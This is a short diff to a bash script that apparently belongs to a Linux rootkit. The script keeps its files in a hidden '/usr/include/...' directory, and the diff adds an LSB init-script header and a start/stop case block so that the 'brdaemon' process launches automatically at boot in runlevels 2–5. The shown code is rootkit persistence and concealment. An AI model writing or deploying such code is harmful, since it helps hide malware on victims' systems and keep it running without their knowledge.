@@ -1,4 +1,13 @@
 #!/bin/bash
+### BEGIN INIT INFO
+# Provides:          brdaemon
+# Required-Start:
+# Required-Stop:
+# Default-Start:     2 3 4 5 
+# Default-Stop:     
+# Short-Description: Execute the brdaemon command.
+# Description:
+### END INIT INFO
 
 BR_ROOTKIT_PATH="/usr/include/..."
 
@@ -19,4 +28,12 @@ function br_daemon()
         fi
 }
 
-br_daemon
+case "$1" in
+        "start")
+                br_daemon
+                ;;
+        "stop"|"restart"|"reload")
+                ;;
+        *)
+                ;;
+esac
